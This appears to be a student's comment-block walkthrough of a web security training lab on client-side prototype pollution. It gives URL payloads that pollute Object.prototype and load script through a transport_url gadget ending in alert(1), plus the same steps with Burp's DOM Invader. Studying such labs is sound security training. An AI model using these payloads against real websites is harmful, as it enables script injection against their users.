/*

a) Find a source that you can use to add arbitrary properties to the global Object.prototype
b) Identify a gadget property that allows you to execute arbitrary JavaScript
c) Combine these to call alert().

Manual version
----------------------------------------------------------------------------------
                        -------: Finding a source :-------
1) Look for properties used by resource imports, libraries in the source code
// looking at the home source, we get deparam.js as importlooking at it we see prototype operations

2) try and pollute the prototype via the url
/?__proto__[foo]=bar

// in console type to see if prototype is polluted successfully
>> Object.prototype
Object { foo: "bar", … }

                        -------: Finding a gadget :-------
3) searchlogger.js
// Defined an asynchronous function named searchLogger
async function searchLogger() {

    // Create a configuration object with query parameters from the URL
    let config = {params: deparam(new URL(location).searchParams.toString())};

    // Check if the config object has a 'transport_url' property
    if(config.transport_url) {

        // Create a new <script> element
        let script = document.createElement('script');

        // Set the 'src' attribute of the script element to the 'transport_url' value
        script.src = config.transport_url;

        // Append the script element to the <body> of the HTML document
        document.body.appendChild(script);
    }

new URL(location) creates a URL object from the current page's URL, which allows you to access and manipulate various parts of the URL.

new URL(location).searchParams gives you access to the query parameters of the URL. Query parameters are the key-value pairs that appear in the URL after the "?" character.

.toString() converts the query parameters into a string.

deparam() is assumed to be a custom function or method that is used to parse this string of query parameters and convert it into a JavaScript object. The resulting object is then assigned to the params property of the config object.

As for the appendChild function, it's used to dynamically add the newly created <script> element to the HTML document's <body>


4) pollute the transport_url property
/?__proto__[transport_url]=foo

>> Object.prototype
Object { transport_url: "foo", … }


5) ?__proto__[transport_url]=data:,alert(1);
// Data URIs allow you to embed data directly into the URL



DOM Invader version
----------------------------------------------------------------------------------


    Open the lab in Burp's built-in browser.

    Enable DOM Invader and enable the prototype pollution option.

    Open the browser DevTools panel, go to the DOM Invader tab, then reload the page.

    Observe that DOM Invader has identified two prototype pollution vectors in the search property i.e. the query string.

    Click Scan for gadgets. A new tab opens in which DOM Invader begins scanning for gadgets using the selected source.

    When the scan is complete, open the DevTools panel in the same tab as the scan, then go to the DOM Invader tab.

    Observe that DOM Invader has successfully accessed the script.src sink via the transport_url gadget.

    Click Exploit. DOM Invader automatically generates a proof-of-concept exploit and calls alert(1).



*/